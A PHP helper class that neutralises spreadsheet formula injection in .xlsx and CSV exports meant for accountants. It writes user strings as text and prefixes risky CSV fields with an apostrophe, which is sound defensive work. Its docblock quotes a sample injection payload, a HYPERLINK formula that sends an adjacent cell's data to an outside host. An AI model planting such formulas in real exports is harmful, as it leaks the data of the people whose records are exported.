<?php

namespace App\Support;

use OpenSpout\Common\Entity\Cell;
use OpenSpout\Common\Entity\Cell\StringCell;
use OpenSpout\Common\Entity\Row;
use OpenSpout\Common\Entity\Style\Style;

/**
 * Keeps user-typed text inert in the spreadsheets we hand to accountants.
 *
 * A customer or vendor named =HYPERLINK("http://x?"&B2,"Open") became a live
 * formula in the exported .xlsx (OpenSpout turns any string starting with "="
 * into a formula cell) and in the CSV once Excel opened it. Text is written as
 * text; in CSV a cell that Excel would run as a formula gets the standard
 * leading apostrophe. Phone numbers like "+91 98765 43210" and negative
 * amounts are left exactly as they are.
 */
final class SafeExport
{
    /** An .xlsx cell: strings are always text, never formulas. */
    public static function cell(mixed $value, ?Style $style = null): Cell
    {
        if (is_string($value)) {
            return new StringCell($value, $style);
        }

        return Cell::fromValue($value, $style);
    }

    /** @param array<int, mixed> $values */
    public static function row(array $values, ?Style $style = null): Row
    {
        return new Row(array_map(fn ($v) => self::cell($v, $style), array_values($values)));
    }

    /** A CSV field Excel would evaluate gets a leading apostrophe. */
    public static function csvField(mixed $value): mixed
    {
        if (! is_string($value) || $value === '' || is_numeric($value)) {
            return $value;
        }
        $first = $value[0];
        $risky = $first === '=' || $first === '@' || $first === "\t" || $first === "\r"
            || (($first === '+' || $first === '-') && preg_match('/[(!|:"=]/', $value));

        return $risky ? "'" . $value : $value;
    }

    /** @param array<int, mixed> $fields */
    public static function csvRow(array $fields): array
    {
        return array_map(fn ($v) => self::csvField($v), $fields);
    }
}
